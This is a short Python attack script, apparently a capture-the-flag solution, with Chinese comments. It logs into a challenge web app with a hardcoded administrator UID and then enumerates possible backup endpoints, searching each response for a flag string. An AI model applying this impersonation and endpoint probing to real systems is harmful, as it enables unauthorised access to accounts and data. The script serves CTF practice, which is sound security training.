import requests
import re

BASE_URL = "http://8080-f38af472-f3ae-405c-9d07-9ac048a61efd.challenge.ctfplus.cn"
session = requests.Session()

print("[[*] Flask 备份接口漏洞 - 备份接口测试")
print(f"[*] Target: {BASE_URL}")
print()

# 用 ADMiN 的 UID 登录
uid = "3553c1effa0b4698895a4874cfbd86d8"

print(f"[*] 登录 ADMiN (UID: {uid})")
login_resp = session.post(f"{BASE_URL}/login", data={"uid": uid})
print(f"    POST /login: {login_resp.status_code}")

# 尝试所有可能的备份路径
print(f"\n[*] 测试备份接口:")

backup_tests = [
    # 基本路径
    ("GET", "/backup", {}),
    ("GET", "/admin/backup", {}),
    ("GET", "/api/backup", {}),
    ("GET", "/user/backup", {}),
    ("GET", "/download/backup", {}),
    # 带参数
    ("GET", "/backup", {"file": "backup.zip"}),
    ("GET", "/backup", {"path": "backup"}),
    ("GET", "/backup", {"filename": "backup.zip"}),
    ("GET", "/backup", {"download": "true"}),
    # POST
    ("POST", "/backup", {}),
    ("POST", "/backup", {"file": "backup.zip"}),
    ("POST", "/admin/backup", {}),
]

for method, path, data in backup_tests:
    if method == "GET":
        resp = session.get(f"{BASE_URL}{path}", params=data)
    else:
        resp = session.post(f"{BASE_URL}{path}", data=data)
    
    print(f"    [-] {method} {path} {data}")
    print(f"        Status: {resp.status_code}")
    
    if resp.status_code != 404 and resp.status_code != 405:
        print(f"        [+] 成功! 响应:")
        print(f"        {resp.text[:500]}")
        
        if "flag" in resp.text.lower() or "ctf" in resp.text.lower():
            print(f"        [!!!] 发现 flag!")
            flag_match = re.search(r'flag\{[^}]+\}', resp.text, re.IGNORECASE)
            if flag_match:
                print(f"        [!!!] Flag: {flag_match.group()}")
        
        print()

print()
print("[*] 完成!")
